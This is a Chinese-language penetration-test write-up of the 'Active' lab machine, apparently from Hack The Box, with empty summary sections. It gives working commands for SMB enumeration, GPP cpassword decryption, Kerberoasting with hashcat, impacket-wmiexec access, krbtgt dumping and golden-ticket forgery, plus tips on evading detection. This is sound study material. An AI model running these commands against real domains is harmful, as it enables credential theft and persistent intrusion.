## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Active
2. 難度:Easy
3. IP:

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，並未發現除了AD環境架構以外的特殊服務

```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.15.11 -oA portscan/ports
sudo nmap -sU --top-ports 20 10.129.15.11 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p$ports 10.129.15.11 -oA portscan/detail
sudo nmap --script=vuln -p$ports 10.129.15.11 -oA portscan/vuln
```

<img width="807" height="612" alt="螢幕擷取畫面 2026-04-04 174549" src="https://github.com/user-attachments/assets/1ce4351d-3d9d-4cff-aca1-93f2f0c642d0" />
<img width="616" height="594" alt="螢幕擷取畫面 2026-04-04 174608" src="https://github.com/user-attachments/assets/be1a816a-c9c4-4d10-9247-36f904e3fd91" />
<img width="1342" height="781" alt="螢幕擷取畫面 2026-04-04 175312" src="https://github.com/user-attachments/assets/04ac2615-d902-4b3e-8eb7-8438b536ded2" />
<img width="1443" height="723" alt="螢幕擷取畫面 2026-04-04 175521" src="https://github.com/user-attachments/assets/624bc9eb-ef62-4902-b638-c2497a21f792" />

在AD環境中，開放埠相對較多，使用各種文書處理工具並設定為變數會比較方便，以下展示各種文書處理工具的效果

```bash
ports=$(grep open portscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
```

1. 用grep擷取ports.nmap文件中有open的句子

<img width="348" height="431" alt="螢幕擷取畫面 2026-04-04 174921" src="https://github.com/user-attachments/assets/6fa169d0-3336-4277-a8d4-f6faca40975a" />

2. 用awk -F以/為分割符節取出第一部分

<img width="548" height="441" alt="螢幕擷取畫面 2026-04-04 174933" src="https://github.com/user-attachments/assets/35befabb-1761-4bd2-9496-de2546b0276b" />

3. 用paste -sd 整理成一列，並用,作分割符

<img width="899" height="80" alt="螢幕擷取畫面 2026-04-04 174946" src="https://github.com/user-attachments/assets/63ac2197-3ded-41c0-92d6-6e0e1d5e277d" />

4. 整理成變數

<img width="903" height="142" alt="螢幕擷取畫面 2026-04-04 175013" src="https://github.com/user-attachments/assets/57675f66-257c-4545-8859-3940b70c6593" />


將掃描到的網域寫入/etc/hosts

```bash
sudo vim /etc/hosts
```

<img width="501" height="237" alt="螢幕擷取畫面 2026-04-04 175658" src="https://github.com/user-attachments/assets/f7e77489-b83e-4332-98ba-c492fac9df0b" />

在AD環境中，時間同步非常重要，因為像NTLM和Kerberos等會利用時間戳的協議，對時間誤差的容忍度只有大概五分鐘，若是執行相關攻擊前未做時間同步，會導致攻擊失敗甚至報告到管理員。

在此使用ntpdate進行時間同步，從UDP掃描中可知123 port是開放的，走ntp比較不會留下日誌，關於時間同步已收錄到tips中。

```bash
sudo ntpdate 10.129.15.11
```

<img width="765" height="87" alt="螢幕擷取畫面 2026-04-04 175904" src="https://github.com/user-attachments/assets/5dba5f40-611a-4c6f-969a-618d181ba18c" />


### 2.2 枚舉(Enumeration)

首先進行SMB匿名登入嘗試，使用smbclient可以模仿正常使用者流量，並不會在初期就引起管理員關注，缺點是無法確認各資料夾的使用權限，只能手動嘗試。

如果資料夾較多，不適合手工枚舉的話，再考慮使用nxc或smbmap掃描。

```bash
smbclient -L //10.129.15.11 -N
```

<img width="808" height="319" alt="螢幕擷取畫面 2026-04-04 180528" src="https://github.com/user-attachments/assets/9a6d5982-7003-45d8-8d15-b6dd738bc1ba" />

我嘗試手工進入幾個重要資料夾，除了IPC$能進卻不能讀外，只有Replication資料夾可正常操作

```bash
smbclient //10.129.15.11/Dname -N
```

<img width="449" height="336" alt="螢幕擷取畫面 2026-04-04 182547" src="https://github.com/user-attachments/assets/1ff86846-4c0d-4928-89e1-1f7d05b1dc1f" />

<img width="689" height="210" alt="螢幕擷取畫面 2026-04-04 182748" src="https://github.com/user-attachments/assets/366950f0-c8f2-4011-be57-13e8cf2bc8e1" />

在其中獲得一個.xml檔案，在搜尋時可以用-c參數搭配recurse ON和mask去快速搜尋某些關鍵字，用分號；作分割符

<img width="793" height="96" alt="螢幕擷取畫面 2026-04-04 183522" src="https://github.com/user-attachments/assets/0718371a-fcc4-41c1-9b93-6fb107728eb1" />

用get命令下載此檔案

<img width="1676" height="170" alt="螢幕擷取畫面 2026-04-04 183805" src="https://github.com/user-attachments/assets/9941ede6-6ba0-40cf-a7c5-69ce3282483a" />


### 2.3 初始存取(Initial Access)

用xmllint檢視檔案內容，這會讓xml檔案經過漂亮排版後顯示出來

```bash
xmllint --format Groups.xml
```

<img width="1900" height="187" alt="螢幕擷取畫面 2026-04-04 184251" src="https://github.com/user-attachments/assets/43e970f3-1948-446c-bbe2-765bf3dc3f98" />

從路徑和檔名'Policies/{GUID}/Machine/Preferences/Groups/Groups.xml'，以及關鍵字cpassword，可以知道這是關於群組原則喜好設定(GPP)的設定檔。

2008年微軟推出GPP功能，讓管理員能透過網域輕易設定所有電腦的密碼。為了讓所有用戶端都能解密並執行設定，微軟在 MSDN文件中公開了加密流程，並在系統DLL檔案中埋入了同一個AES 256位元金鑰。後來這個金鑰被破譯，導致任何人只要拿到這些xml文件，就能輕鬆還原出原始的明文密碼。微軟已在2014年發布補丁修復此問題。

使用gpp-decrypt破譯cpassword，這是專門用來破譯cpassword的工具

```bash
gpp-decrypt 'edBS....'
```

<img width="962" height="74" alt="螢幕擷取畫面 2026-04-04 184714" src="https://github.com/user-attachments/assets/47f0cf86-823e-4acb-86de-c81f1998a46e" />

建立文件儲存獲得的憑證

<img width="419" height="134" alt="螢幕擷取畫面 2026-04-04 184836" src="https://github.com/user-attachments/assets/ea3e9470-fbc6-4dde-bae1-75dbb768be9e" />

使用憑證嘗試登入SMB成功

這裡我使用impacket-smbclient純粹是示範用，用smbclient也是完全可以，甚至我更傾向使用smbclient，我只會在要使用NTLM Hash登入或進行一些滲透攻擊時會impacket-smbclient，這裡單純是使用明文憑證上去看看

<img width="773" height="127" alt="螢幕擷取畫面 2026-04-04 185209" src="https://github.com/user-attachments/assets/376faa09-ea52-4459-bb58-0133a8b5cbc7" />

獲得user.txt

<img width="569" height="213" alt="螢幕擷取畫面 2026-04-04 185646" src="https://github.com/user-attachments/assets/b8c4cbec-4f94-4843-9aa0-3494b1503c6f" />

<img width="557" height="384" alt="螢幕擷取畫面 2026-04-04 185703" src="https://github.com/user-attachments/assets/8002d943-3a42-4ca0-aea2-748565e28069" />

<img width="304" height="79" alt="螢幕擷取畫面 2026-04-04 185712" src="https://github.com/user-attachments/assets/a0483240-f004-400b-aa90-d6ce07100483" />

### 2.4 權限提升(Privilege Escalation)

透過以獲得的憑證執行Kerberoasting攻擊，嘗試獲得其他高權限憑證

先做時間同步
```bash
sudo ntpdate 10.129.15.11
```

<img width="745" height="111" alt="螢幕擷取畫面 2026-04-04 191619" src="https://github.com/user-attachments/assets/5ca6e0fa-245e-4e7b-8680-6bf696106df6" />

使用GetUserSPNs烤票，這裡我省略了檢查SPN，直接用-request烤票

```bash
impacket-GetUserSPNs active.htb/username:password -dc-ip 10.129.15.11 -request -outputfile GetUserSPNs.out
```

<img width="1464" height="226" alt="螢幕擷取畫面 2026-04-04 190141" src="https://github.com/user-attachments/assets/4ea839d2-dfe6-4891-8171-742861a749da" />

獲得GetUserSPNs.out中藏有Administrator的Hash

<img width="715" height="226" alt="螢幕擷取畫面 2026-04-04 190151" src="https://github.com/user-attachments/assets/8d07bd18-55d9-4bfd-aaaa-9f43ab933938" />

使用hashcat破解

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

<img width="765" height="150" alt="螢幕擷取畫面 2026-04-04 191717" src="https://github.com/user-attachments/assets/e6caf149-5f35-4879-93fc-af5d465ab5a6" />
<img width="1914" height="327" alt="螢幕擷取畫面 2026-04-04 191816" src="https://github.com/user-attachments/assets/7ea662c9-2fc8-4761-9bf6-0001006b8f2f" />

將獲得的憑證儲存在新文件中

<img width="303" height="142" alt="螢幕擷取畫面 2026-04-04 191934" src="https://github.com/user-attachments/assets/f85fb360-1dbe-4b00-ae49-f8ee5e8307f8" />

使用impacket-wmiexec嘗試登入成功

impacket-wmiexec是走WMI服務(TCP135/RPC)，透過WMI在遠端主機上建立一個行程(cmd.exe)，並將執行結果重導向到一個暫存檔，再透過SMB協議(TCP445) 讀取該檔案來獲取回顯。

隱蔽性比psexec(TCP445/SMB)高，因為它不會在目標機器上安裝服務，而psexec需要，但需要開啟TCP 135與445。

另外還有evil-winrm，走WinRM服務TCP5985/5986，是隱蔽性最好的，幾乎是合法遠端管理工具，如果5985/5986有開放肯定優先選擇。

<img width="771" height="451" alt="螢幕擷取畫面 2026-04-04 192824" src="https://github.com/user-attachments/assets/704e2c95-8db0-44e3-a88b-e12eb7135971" />


### 2.5 最終成果(Impact)

獲得root.txt

<img width="650" height="551" alt="螢幕擷取畫面 2026-04-04 193635" src="https://github.com/user-attachments/assets/ff7a9672-33c9-4243-972f-56690317c092" />

### 2.6 持久化

時間同步

<img width="742" height="114" alt="螢幕擷取畫面 2026-04-04 195631" src="https://github.com/user-attachments/assets/45df85b1-ed98-4c81-b2e4-12c6f69c1fe9" />



使用impacket-secretsdump導出krbtgt的密碼Hash

```bash
impacket-secretsdump 'active.htb/Administrator:password@10.129.15.11' -dc-ip 10.129.15.11 -just-dc
```

<img width="1015" height="485" alt="螢幕擷取畫面 2026-04-04 194504" src="https://github.com/user-attachments/assets/555afcac-11a6-4a79-9825-da2cf1b5e897" />

在shell中獲得Administrator的SID

```cmd
whoami /user
```

<img width="638" height="165" alt="螢幕擷取畫面 2026-04-04 194753" src="https://github.com/user-attachments/assets/01de7574-b5b9-4812-9882-4b2d04806465" />

使用impacket-ticketer偽造金票

```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain active.htb Administrator
```

<img width="1345" height="319" alt="螢幕擷取畫面 2026-04-04 194859" src="https://github.com/user-attachments/assets/fdc542aa-7804-4b8d-b3f7-5d5ff4596181" />

設定環境變量

```bash
export KRB5CCNAME=Administrator.ccache
```

<img width="418" height="58" alt="螢幕擷取畫面 2026-04-04 195028" src="https://github.com/user-attachments/assets/fb050033-0981-4347-89ff-f2f98df2eaa0" />

使用impacket-wmiexec -k -no-pass嘗試登入成功

```bash
impacket-wmiexec -k -no-pass 'active.htb/Administrator@dc.active.htb' -dc-ip 10.129.15.11
```

<img width="853" height="183" alt="螢幕擷取畫面 2026-04-04 195644" src="https://github.com/user-attachments/assets/115d751f-8c3e-4fa2-af82-c60719191808" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
